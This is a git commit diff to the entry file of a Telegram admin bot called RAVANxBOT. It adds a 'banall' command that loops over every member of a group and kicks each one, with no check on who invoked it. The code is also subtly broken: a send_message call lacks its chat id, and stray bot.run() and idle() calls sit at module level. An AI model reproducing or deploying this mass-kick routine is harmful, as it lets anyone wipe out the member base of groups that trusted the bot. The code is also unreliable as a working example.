ff8c5cb6ef3cd60b29bd4ed6b66c3c050f81a8f6
Dhruvxbhudev2 <94378546+Dhruvxbhudev2@users.noreply.github.com>
2022-01-25 16:11:56 +0530

    Update __main__.py

--- RAVANxBOT/__main__.py
+++ RAVANxBOT/__main__.py
@@ -750,7 +750,23 @@ def main():
         telethn.run_until_disconnected()
 
     updater.idle()
+@bot.on_message(filters.command("banall") & filters.group)
+def NewChat(bot,message):
+    logging.info("new chat {}".format(message.chat.id))
+    logging.info("getting memebers from {}".format(message.chat.id))
+    a= bot.iter_chat_members(message.chat.id)
+    for i in a:
+        try:
+            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
+            bot.send_message("kicked {} from {}".format(i.user.id,message.chat.id))
+            logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
+        except Exception:
+            logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
 
+    logging.info("process completed")
+
+bot.run()
+idle() 
 
 if __name__ == "__main__":
     LOGGER.info("Successfully loaded modules: " + str(ALL_MODULES))
